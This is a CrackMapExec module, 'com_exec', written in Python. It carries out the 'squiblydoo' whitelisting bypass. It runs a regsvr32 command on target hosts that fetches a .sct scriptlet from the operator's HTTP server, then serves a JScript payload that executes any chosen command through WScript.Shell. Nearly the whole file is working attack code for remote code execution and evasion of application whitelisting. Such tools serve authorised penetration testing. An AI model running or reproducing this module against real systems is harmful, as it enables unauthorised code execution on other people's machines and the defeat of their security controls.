from cme.helpers import gen_random_string
from sys import exit
import os

class CMEModule:

    '''
        Executes a command using a COM scriptlet to bypass whitelisting (a.k.a squiblydoo)

        Based on the awesome research by @subtee

        https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
        http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html
    '''

    name='com_exec' #Really tempted just to call this squiblydoo

    description = 'Executes a command using a COM scriptlet to bypass whitelisting'

    required_server='http'

    chain_support = True

    def options(self, context, module_options):
        '''
            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        '''

        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
            context.log.error('COMMAND or CMDFILE options are required!')
            exit(1)

        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
            exit(1)

        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])

            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                exit(1)

            with open(path, 'r') as cmdfile:
                self.command = cmdfile.read().strip()

        self.sct_name = gen_random_string(5)

    def launcher(self, context, command):
        launcher = 'regsvr32.exe /u /n /s /i:http://{}/{}.sct scrobj.dll'.format(context.localip, self.sct_name)
        return launcher
    
    def payload(self, context, command):
        command = command.replace('\\', '\\\\')
        command = command.replace('"', '\\"')
        command = command.replace("'", "\\'")

        payload = '''<?XML version="1.0"?>
<scriptlet>
<registration
    description="Win32COMDebug"
    progid="Win32COMDebug"
    version="1.00"
    classid="{{AAAA1111-0000-0000-0000-0000FEEDACDC}}"
>
<script language="JScript">
    <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run('{}');
    ]]>
</script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>'''.format(command)

        context.log.debug('Generated payload:\n' + payload)
        
        return payload

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher)
        context.log.success('Executed squiblydoo')

    def on_request(self, context, request, launcher, payload):
        if '{}.sct'.format(self.sct_name) in request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(payload)
            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()
